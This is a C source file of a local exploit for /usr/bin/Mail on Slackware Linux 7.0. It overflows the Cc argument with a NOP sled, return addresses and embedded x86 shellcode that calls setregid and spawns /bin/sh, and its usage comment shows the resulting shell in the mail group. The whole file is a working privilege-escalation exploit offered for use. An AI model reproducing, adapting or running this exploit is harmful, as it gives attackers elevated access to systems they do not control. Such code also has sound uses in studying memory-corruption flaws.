/*
 * mail-slak.c (C) 2000 Paulo Ribeiro <prrar@nitnet.com.br>
 *
 * Exploit for /usr/bin/Mail.
 * Made specially for Slackware Linux 7.0.
 * Based on mailx.c by funkySh.
 *
 * OBS.: Without fprintf(stderr) is not possible to print the message.
 *
 * USAGE:
 * slack$ ./mail-slak
 * type '.' and enter: .
 * Cc: too long to edit
 * sh-2.03$ id
 * uid=1000(user) gid=12(mail) groups=100(users)
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char buffer[10000];
char shellcode[] =     
"\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1\x0c\x31"
                       
"\xc0\xb0\x47\xcd\x80\x31\xdb\x31\xc9\xb3\x0c\xb1"
                       
"\x0c\x31\xc0\xb0\x47\xcd\x80\xeb\x1f\x5e\x89\x76"
                       
"\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89"
                       
"\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
                        "\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
               
unsigned long getesp(void)
{
        __asm__("movl %esp,%eax");
}

int main(int argc, char **argv)
{
        int x;
        long addr = getesp() - 18000;

        memset(buffer, 0x90, 10000);
        memcpy(buffer + 800, shellcode, strlen(shellcode));

        for(x = 876; x < 9998; x += 4)
                *(int *)&buffer[x] = addr;

        fprintf(stderr, "type '.' and enter: ");

        execl("/usr/bin/Mail", "/usr/bin/Mail", "nobody", "-s",
                "blah", "-c", buffer, 0);
}

/* mail-slack.c: EOF */














